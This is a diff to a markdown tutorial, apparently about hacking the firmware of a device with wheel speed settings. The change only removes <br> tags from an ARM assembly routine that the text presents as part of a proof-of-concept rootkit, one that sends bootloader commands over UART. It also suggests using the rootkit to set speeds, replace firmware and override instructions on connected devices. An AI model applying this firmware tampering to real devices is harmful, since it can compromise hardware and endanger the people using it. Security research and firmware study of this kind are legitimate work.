@@ -229,75 +229,75 @@ C8  :Wheel  Reference  Speed  Ramp  Rate  Limit
 
 16. Congrats! You have successfully implement your proof of concept rootkit! What other functions would we be able to develop using a more flushed out rootkit? Communicate from the device to other connected devices! Set their speed, replace firmware, override instructions., and more! Brodcats to bootloader commands:
 ```
-		undefined Send_UART_Cmd()  <br>
-	    r0:4           input  <br>
-	    r1:4           length  <br>
-	    r2:4           usart  <br>
-	    r0:4           end_flag  <br>
-	Send_UART_Cmd  <br>
-	    cpsid      i  <br>
-	    movw       r0, #0x98f0  <br>
-	    movt       r0, #0x803  <br>
-	    movs       length, #0x18  <br>
-	    movw       r2, #0x4400  <br>
-	    movt       r2, #0x4000  <br>
-	    movw       r5, #0x4428  <br>
-	    movt       r5, #0x4000  <br>
-	loop<br>
-	    ldrb       r3, [input, #0x0]  <br>
-	    adds       end_flag, #0x1  <br>
-	    subs       length, #0x1  <br>
-	    cmp        r3, #0x1f  <br>
-	    bne        normal_send  <br>
-	    ldrb       r4, [end_flag, #0x0]  <br>
-	    cmp        r4, #0xff  <br>
-	    bne        normal_send  <br>
-	    adds       end_flag, #0x1  <br>
-	    subs       length, #0x1  <br>
-	    bl         wait_txe  <br>
-	    movs       r6, #0x1f  <br>
-	    strb       r6, [r5, #0x0] <br> 
-	    bl         wait_txe  <br>
-	    movs       r6, #0xff  <br>
-	    strb       r6, [r5, #0x0] <br> 
-	    bl         wait_tc_loop  <br>
-	    bl         send_break  <br>
-	    b          check_continue  <br>
-	normal_send  <br>
-	    bl         wait_txe  <br>
-	    strb       r3, [r5, #0x0]  <br>
-	check_continue  <br>
-	    cmp        length, #0x0  <br>
-	    bne        loop  <br>
+		undefined Send_UART_Cmd()  
+	    r0:4           input  
+	    r1:4           length  
+	    r2:4           usart  
+	    r0:4           end_flag  
+	Send_UART_Cmd  
+	    cpsid      i  
+	    movw       r0, #0x98f0  
+	    movt       r0, #0x803  
+	    movs       length, #0x18  
+	    movw       r2, #0x4400  
+	    movt       r2, #0x4000  
+	    movw       r5, #0x4428  
+	    movt       r5, #0x4000  
+	loop
+	    ldrb       r3, [input, #0x0]  
+	    adds       end_flag, #0x1 
+	    subs       length, #0x1
+	    cmp        r3, #0x1f  
+	    bne        normal_send  
+	    ldrb       r4, [end_flag, #0x0]  
+	    cmp        r4, #0xff  
+	    bne        normal_send  
+	    adds       end_flag, #0x1  
+	    subs       length, #0x1  
+	    bl         wait_txe  
+	    movs       r6, #0x1f  
+	    strb       r6, [r5, #0x0] 
+	    bl         wait_txe  
+	    movs       r6, #0xff  
+	    strb       r6, [r5, #0x0] 
+	    bl         wait_tc_loop  
+	    bl         send_break  
+	    b          check_continue  
+	normal_send  
+	    bl         wait_txe  
+	    strb       r3, [r5, #0x0]  
+	check_continue  
+	    cmp        length, #0x0  
+	    bne        loop  
 	    nop  <br>
-	    cpsid      i <br> 
-	    dsb        #0xf  <br>
-	    isb        #0xf  <br>
-	    bl         FUN_0801a514  <br>
-	    bx         lr  <br>
-	wait_txe  <br>
-	    ldr        r4, [r2, #0x1c]  <br>
-	    tst        r4, #0x80  <br>
-	    beq        wait_txe  <br>
-	    bx         lr  <br>
-	wait_tc_loop  <br>
-	    ldr        r4, [r2, #0x1c]  <br>
-	    tst        r4, #0x40  <br>
-	    beq        wait_tc_loop  <br>
-	    bx         lr  <br>
-	send_break  <br>
-	    movs       r7, #0x2  <br>
-	    strb       r7, [r2, #0x1c]  <br>
-	wait_break_clear  <br>
-	    ldr        r4, [r2, #0x1c]  <br>
-	    tst        r4, #0x40000  <br>
-	    bne        wait_break_clear  <br>
-	wait_for_input  <br>
-	    ldr        r4, [r2, #0x1c]  <br>
-	    tst        r4, #0x20  <br>
-	    beq        wait_for_input <br> 
-	    ldr        r4, [r2, #0x24]  <br>
-	    bl         loop  <br>
+	    cpsid      i 
+	    dsb        #0xf  
+	    isb        #0xf  
+	    bl         FUN_0801a514  
+	    bx         lr  
+	wait_txe  
+	    ldr        r4, [r2, #0x1c]  
+	    tst        r4, #0x80  
+	    beq        wait_txe  
+	    bx         lr  
+	wait_tc_loop  
+	    ldr        r4, [r2, #0x1c]  
+	    tst        r4, #0x40  
+	    beq        wait_tc_loop  
+	    bx         lr  
+	send_break  
+	    movs       r7, #0x2  
+	    strb       r7, [r2, #0x1c]  
+	wait_break_clear  
+	    ldr        r4, [r2, #0x1c]  
+	    tst        r4, #0x40000  
+	    bne        wait_break_clear  
+	wait_for_input  
+	    ldr        r4, [r2, #0x1c]  
+	    tst        r4, #0x20  
+	    beq        wait_for_input 
+	    ldr        r4, [r2, #0x24]  
+	    bl         loop 
 	080398f0 1f               
 	080398f1 7f              
 	080398f2 06              
